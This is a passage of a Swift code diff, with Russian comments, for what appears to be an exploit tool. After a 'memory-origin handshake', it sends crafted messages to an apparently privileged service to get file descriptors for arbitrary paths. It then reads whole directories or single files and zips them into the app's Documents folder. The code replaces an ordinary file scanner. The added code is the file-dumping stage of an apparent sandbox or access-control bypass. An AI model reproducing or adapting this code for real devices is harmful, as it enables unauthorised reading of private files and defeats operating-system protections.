+        _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
+        fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
+        let (rp, rt) = send(m)
+        fRel(OpaquePointer(m))
+        guard rt == "dictionary", let rp = rp else {
+            logLine("Request failed for \(path): \(rt)")
+            if let rp = rp { fRel(rp) }
+            return nil
+        }
+        guard let details = fVal(rp, "ByteStreamDetails") else {
+            let err = fI64(rp, ".ErrorReturn")
+            logLine("Access denied for \(path) (\(err))")
+            fRel(rp)
+            return nil
+        }
+        let oid = fU64(details, "ObjectID")
+        let fd = fDupFd(details, "FileDescriptor")
+
+        // Закрываем стрим на сервере
+        var mD: UnsafeMutableRawPointer? = nil
+        if fBasic(0x646f6f6d, oid, &mD) == 0, let mD = mD {
+            let (rd, _) = send(mD)
+            if let rd = rd { fRel(rd) }
+            fRel(OpaquePointer(mD))
+        }
+        fRel(rp)
+
+        return fd >= 0 ? fd : nil
+    }
+
+    if handshakeReady {
+        logLine("Opening target path: \(targetPath)")
+        if let initialFd = probe(targetPath) {
+            var st = stat()
+            if fstat(initialFd, &st) == 0 {
+                let fileType = st.st_mode & mode_t(S_IFMT)
+                if fileType == mode_t(S_IFDIR) {
+                    logLine("Target is a directory.")
+                    let fileNames = getFilesInDirectory(fd: initialFd)
+                    // Обратите внимание: close(initialFd) убран, так как getFilesInDirectory сам закрывает fd при вызове closedir.
+
+                    let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
+                    do {
+                        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
+                    } catch {
+                        logLine("Failed to create temp directory: \(error.localizedDescription)")
+                        return
                     }
-                } catch {
-                    failedCount += 1
-                    log("Could not process \(relativePath): \(error.localizedDescription)")
+
+                    var totalBytesRead: Int64 = 0
+                    let basePath = targetPath.hasSuffix("/") ? targetPath : targetPath + "/"
+
+                    for name in fileNames {
+                        let fullFilePath = basePath + name
+                        if let fileFd = probe(fullFilePath) {
+                            var stFile = stat()
+                            if fstat(fileFd, &stFile) == 0 {
+                                let size = Int64(stFile.st_size)
+                                if size > 0 && size <= Int64(Int.max) {
+                                    var buffer = [UInt8](repeating: 0, count: Int(size))
+                                    let count = pread(fileFd, &buffer, buffer.count, 0)
+                                    if count > 0 {
+                                        let fileURL = tempDir.appendingPathComponent(name)
+                                        do {
+                                            try Data(buffer.prefix(count)).write(to: fileURL, options: .atomic)
+                                            totalBytesRead += Int64(count)
+                                        } catch {}
+                                    }
+                                }
+                            }
+                            close(fileFd)
+                        }
+                    }
+
+                    let zipFilename = outputName + ".zip"
+                    let destinationZipURL = docs.appendingPathComponent(zipFilename)
+                    try? FileManager.default.removeItem(at: destinationZipURL)
+
+                    let coordinator = NSFileCoordinator()
+                    var coordinationError: NSError?
+                    var successZip = false
+
+                    coordinator.coordinate(readingItemAt: tempDir, options: [.forUploading], error: &coordinationError) { zipURL in
+                        do {
+                            try FileManager.default.copyItem(at: zipURL, to: destinationZipURL)
+                            successZip = true
+                        } catch {
+                            logLine("Failed to copy zip: \(error.localizedDescription)")
+                        }
+                    }
+
+                    try? FileManager.default.removeItem(at: tempDir)
+
+                    if successZip {
+                        logLine("Saved \(totalBytesRead) bytes: \(zipFilename)")
+                    } else {
+                        logLine("Failed to create zip archive")
+                    }
+
+                } else if fileType == mode_t(S_IFREG) {
+                    logLine("Target is a single file.")
+                    saveFile(fd: initialFd, outputName: outputName)
+                } else {
+                    close(initialFd)
+                    logLine("Target is neither a regular file nor a directory.")
                 }
+            } else {
+                close(initialFd)
+                logLine("Failed to fstat target FD.")
             }
         } else {
-            failedCount += 1
-            log("Could not create recursive directory enumerator.")
+            logLine("Failed to obtain initial FD for target path.")
         }
-    }
-
-    log("Scan complete: \(fileCount) files, \(totalBytes) bytes, \(failedCount) failures.")
-
-    let documents = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
-    let zipURL = documents.appendingPathComponent(folderName + mode.zipSuffix + ".zip")
-    try? fileManager.removeItem(at: zipURL)
-
-    let coordinator = NSFileCoordinator()
-    var coordinationError: NSError?
-    var archiveError: String?
-    var archiveCreated = false
-
-    coordinator.coordinate(readingItemAt: outputRoot, options: [.forUploading], error: &coordinationError) { temporaryZipURL in
-        do {
-            try fileManager.copyItem(at: temporaryZipURL, to: zipURL)
-            archiveCreated = true
-        } catch {
-            archiveError = error.localizedDescription
-        }
-    }
-
-    if let coordinationError = coordinationError {
-        failedCount += 1
-        log("ZIP coordination failed: \(coordinationError.localizedDescription)")
-    }
-    if let archiveError = archiveError {
-        failedCount += 1
-        log("ZIP save failed: \(archiveError)")
-    }
-
-    if archiveCreated {
-        log("Saved archive: \(zipURL.lastPathComponent)")
     } else {
-        log("Archive was not created.")
+        logLine("Read skipped: memory-origin handshake was not established")
     }
-
-    // Save a separate log for this run: no shared global file descriptor.
-    let logName = "run-\(mode.zipSuffix.dropFirst())-\(UUID().uuidString.prefix(8)).log"
-    let logURL = documents.appendingPathComponent(logName)
-    try? (lines.joined(separator: "\n") + "\n").write(to: logURL, atomically: true, encoding: .utf8)
-
-    return ScanOutput(
-        lines: lines,
-        zipURL: archiveCreated ? zipURL : nil,
-        fileCount: fileCount,
-        totalBytes: totalBytes,
-        failedCount: failedCount
-    )
 }
